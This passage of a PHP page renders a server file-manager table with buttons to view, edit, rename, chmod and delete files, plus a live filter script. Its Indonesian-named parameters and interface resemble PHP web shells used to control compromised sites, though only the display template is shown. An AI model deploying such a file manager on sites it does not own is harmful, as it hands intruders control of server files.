                                                <svg class="svg-icon" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                                            </button>
                                        </form>

                                        <!-- Delete Button -->
                                        <form method="POST" action="?pilihan&path=<?php echo urlencode($currentDir); ?>" style="display:inline;" onsubmit="return confirm('Delete folder <?php echo addslashes($dir); ?> and all its contents?');">
                                            <input type="hidden" name="path" value="<?php echo htmlspecialchars($dirFullPath); ?>">
                                            <input type="hidden" name="pilih" value="hapus">
                                            <button type="submit" class="btn-icon action-delete" title="Delete Folder">
                                                <svg class="svg-icon" viewBox="0 0 24 24"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
                                            </button>
                                        </form>
                                    </div>
                                </td>
                            </tr>
                        <?php endforeach; ?>

                        <!-- Files -->
                        <?php foreach ($files as $file): 
                            $fileFullPath = $currentDir . '/' . $file;
                            $size = @filesize($fileFullPath);
                            $perms = get_file_perms($fileFullPath);
                            $isWritable = is_writable($fileFullPath);
                        ?>
                            <tr class="table-row">
                                <td>
                                    <div class="file-cell">
                                        <!-- File SVG Icon -->
                                        <span class="type-icon file" title="File">
                                            <svg class="svg-icon" viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
                                        </span>
                                        <a href="?fileloc=<?php echo urlencode($fileFullPath); ?>&path=<?php echo urlencode($currentDir); ?>" class="file-link item-name"><?php echo htmlspecialchars($file); ?></a>
                                    </div>
                                </td>
                                <td style="color: var(--text-secondary);"><?php echo format_bytes($size); ?></td>
                                <td>
                                    <span class="perm-code <?php echo $isWritable ? 'writable' : 'locked'; ?>">
                                        <?php echo htmlspecialchars($perms); ?>
                                    </span>
                                </td>
                                <td>
                                    <div class="ops-cell">
                                        <!-- View Button -->
                                        <a href="?fileloc=<?php echo urlencode($fileFullPath); ?>&path=<?php echo urlencode($currentDir); ?>" class="btn-icon action-view" title="View File">
                                            <svg class="svg-icon" viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                                        </a>

                                        <!-- Edit Button -->
                                        <form method="POST" action="?pilihan&path=<?php echo urlencode($currentDir); ?>" style="display:inline;">
                                            <input type="hidden" name="path" value="<?php echo htmlspecialchars($fileFullPath); ?>">
                                            <input type="hidden" name="pilih" value="edit">
                                            <button type="submit" class="btn-icon action-edit" title="Edit File">
                                                <svg class="svg-icon" viewBox="0 0 24 24"><path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"/></svg>
                                            </button>
                                        </form>

                                        <!-- Rename Button -->
                                        <form method="POST" action="?pilihan&path=<?php echo urlencode($currentDir); ?>" style="display:inline;">
                                            <input type="hidden" name="path" value="<?php echo htmlspecialchars($fileFullPath); ?>">
                                            <input type="hidden" name="pilih" value="gantinama">
                                            <button type="submit" class="btn-icon action-rename" title="Rename File">
                                                <svg class="svg-icon" viewBox="0 0 24 24"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
                                            </button>
                                        </form>

                                        <!-- Chmod Button -->
                                        <form method="POST" action="?pilihan&path=<?php echo urlencode($currentDir); ?>" style="display:inline;">
                                            <input type="hidden" name="path" value="<?php echo htmlspecialchars($fileFullPath); ?>">
                                            <input type="hidden" name="pilih" value="ubahmod">
                                            <button type="submit" class="btn-icon action-chmod" title="Change Permissions">
                                                <svg class="svg-icon" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                                            </button>
                                        </form>

                                        <!-- Delete Button -->
                                        <form method="POST" action="?pilihan&path=<?php echo urlencode($currentDir); ?>" style="display:inline;" onsubmit="return confirm('Delete file <?php echo addslashes($file); ?>?');">
                                            <input type="hidden" name="path" value="<?php echo htmlspecialchars($fileFullPath); ?>">
                                            <input type="hidden" name="pilih" value="hapus">
                                            <button type="submit" class="btn-icon action-delete" title="Delete File">
                                                <svg class="svg-icon" viewBox="0 0 24 24"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
                                            </button>
                                        </form>
                                    </div>
                                </td>
                            </tr>
                        <?php endforeach; ?>

                        <?php if (empty($folders) && empty($files)): ?>
                            <tr>
                                <td colspan="4" style="text-align: center; padding: 28px; color: var(--text-muted);">
                                    Directory is empty.
                                </td>
                            </tr>
                        <?php endif; ?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <script>
        // Realtime instant search/filter
        document.getElementById('filterInput').addEventListener('input', function() {
            var filter = this.value.toLowerCase();
            var rows = document.querySelectorAll('#fileTable tbody tr.table-row');
            rows.forEach(function(row) {
                var nameEl = row.querySelector('.item-name');
                if (nameEl) {
                    var text = nameEl.textContent.toLowerCase();
                    row.style.display = text.indexOf(filter) !== -1 ? '' : 'none';
                }
            });
        });
    </script>
</body>
</html>
